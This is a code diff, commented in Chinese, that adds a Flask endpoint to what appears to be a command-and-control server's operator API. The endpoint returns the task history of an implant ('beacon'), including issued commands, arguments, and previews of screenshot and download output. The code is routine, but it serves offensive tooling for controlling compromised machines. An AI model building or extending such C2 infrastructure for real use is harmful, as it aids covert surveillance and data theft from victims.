@@ -108,3 +108,59 @@ def get_task_output(task_id):
             'output_type': content_type,
             'output_content': output_content,  # 可能是 Base64 字符串或纯文本
         })
+
+@operator_bp.route('/task/history/<string:beacon_id>', methods=['GET'])
+def get_beacon_history(beacon_id):
+    """
+    根据 Beacon ID (SF) 查询该植入物的所有任务历史记录和输出。
+    """
+    services = get_services()
+    task_service = services['task_service']
+
+    try:
+        # 验证 Beacon ID
+        if not beacon_id or len(beacon_id) != 64:
+            return jsonify({"error": "Invalid Beacon ID format. Must be 64 characters."}), 400
+
+        with get_db_session() as db:
+            # 从服务层获取该 Beacon 的所有任务记录
+            history_list = task_service.get_tasks_by_beacon_id(db, beacon_id)
+
+            if not history_list:
+                return jsonify([]), 200  # 该 Beacon 尚未执行任何任务
+
+            formatted_history = []
+            for task_info in history_list:
+                # task_info 应该是一个包含 task 和 output 属性的聚合对象 (类似你 get_task_output 中的 task_info)
+                task = task_info.task
+                output = task_info.output
+
+                # 确定内容和格式
+                output_content = output.content if output else None
+
+                if output and task.command in ['screenshot', 'download']:
+                    content_type = 'base64'
+                else:
+                    content_type = 'text'
+
+                # 格式化结果列表
+                formatted_history.append({
+                    'task_id': task.task_id,
+                    'status': task.status,
+                    'command': task.command,
+                    'arguments': task.arguments,
+                    'assigned_at': task.assigned_at.isoformat() if task.assigned_at else None,
+                    'completed_at': task.completed_at.isoformat() if task.completed_at else None,
+
+                    'output_type': content_type,
+                    # 仅返回输出预览，不返回完整大数据（例如整个 Base64 截图）
+                    'output_preview': output_content[:200] + "..." if output_content and len(
+                        output_content) > 200 else output_content,
+                    'output_received_at': output.received_at.isoformat() if output else None
+                })
+
+            return jsonify(formatted_history), 200
+
+    except Exception as e:
+        print(f"[ERROR] Failed to retrieve task history for {beacon_id}: {e}")
+        return jsonify({"error": "Internal server error"}), 500
